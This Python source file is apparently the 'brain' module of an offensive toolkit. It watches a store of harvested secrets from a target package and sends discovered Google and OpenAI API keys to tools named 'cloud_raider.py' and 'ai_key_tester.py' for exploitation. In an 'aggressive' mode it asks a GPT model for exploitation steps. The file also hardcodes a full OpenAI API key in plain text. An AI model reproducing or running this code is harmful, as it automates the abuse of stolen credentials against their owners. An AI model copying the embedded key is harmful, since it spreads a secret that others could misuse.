#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DeepSeek Core v5 — core/brain.py (ChatGPT-4 Powered)
"""
import argparse, heapq, json, os, re, sys, threading, time
import requests
from datetime import datetime

# --- Paths ---
HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

try:
    from intel_store import IntelStore
except ImportError:
    sys.path.append(ROOT)
    from intel_store import IntelStore

if os.name == 'nt':
    sys.stdout.reconfigure(encoding='utf-8')

class Brain:
    def __init__(self, package="", duration=0, max_rounds=0, aggressive=False, **kwargs):
        self.package = package
        self.duration = duration
        self.aggressive = aggressive
        self.max_rounds = max_rounds
        try:
            from core.deepseek_brain import DeepSeekBrain
            self.deepseek = DeepSeekBrain()
        except Exception:
            self.deepseek = None
        self.start_time = time.time()
        self.stop_event = threading.Event()
        self.event_queue = []
        self.seen_secrets = set()
        self.store = IntelStore(package=package, loot_dir=os.path.join(ROOT, "loot"))
        
        # OpenAI Config (Primary Brain)
        self.api_key = "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"
        self.model = "gpt-4o-2024-08-06"

        print("\n" + "*"*60)
        print(f" 🧠 ChatGPT-4 BRAIN IS TAKING CONTROL (Mode: {'AGGRESSIVE' if aggressive else 'STANDARD'})")
        print("*"*60 + "\n")

    def ai_decision(self, intel):
        """Ask ChatGPT-4 for the next best exploitation step."""
        url = "https://api.openai.com/v1/chat/completions"
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        prompt = f"Target: {self.package}\nIntel: {json.dumps(intel)}\nTask: Suggest exploitation steps."
        body = {
            "model": self.model,
            "messages": [{"role": "system", "content": "You are a professional pentester."}, {"role": "user", "content": prompt}],
            "temperature": 0.2
        }
        try:
            r = requests.post(url, headers=headers, json=body, timeout=15)
            if r.status_code == 200:
                return r.json()["choices"][0]["message"]["content"]
        except: pass
        return "Continue monitoring."

    def worker(self):
        try:
            import core.tool_runner as tr
        except: return

        while not self.stop_event.is_set() or self.event_queue:
            if not self.event_queue:
                time.sleep(1); continue
            
            try:
                _, _, event = heapq.heappop(self.event_queue)
                print(f"[BRAIN] ⚡ EXPLOITING: {event['kind']} -> {event['value'][:20]}...")
                
                # Ask AI for advice if aggressive
                if self.aggressive:
                    advice = self.ai_decision(event)
                    print(f"[BRAIN] 🤖 AI Advice: {advice[:100]}...")

                if "google" in event["kind"]:
                    tr.run_tool("cloud_raider.py", api_key=event["value"], package=self.package)
                elif "openai" in event["kind"]:
                    tr.run_tool("ai_key_tester.py", key=event["value"])
            except: pass

    def run(self):
        print("[BRAIN] Monitoring IntelStore for new findings...")
        threading.Thread(target=self.worker, daemon=True).start()

        try:
            while not self.stop_event.is_set():
                secrets = self.store.query("secret")
                for s in secrets:
                    if s["value"] not in self.seen_secrets:
                        self.seen_secrets.add(s["value"])
                        heapq.heappush(self.event_queue, (1, time.time(), {"kind": s.get("note", "unknown"), "value": s["value"]}))
                
                if self.duration > 0 and (time.time() - self.start_time) > self.duration: break
                time.sleep(2)
        except KeyboardInterrupt: pass
        finally:
            self.stop_event.set()
            self.store.save()
            print("[BRAIN] Mission complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--package", required=True)
    parser.add_argument("--duration", type=int, default=30)
    parser.add_argument("--aggressive", action="store_true")
    args = parser.parse_args()
    Brain(package=args.package, duration=args.duration, aggressive=args.aggressive).run()
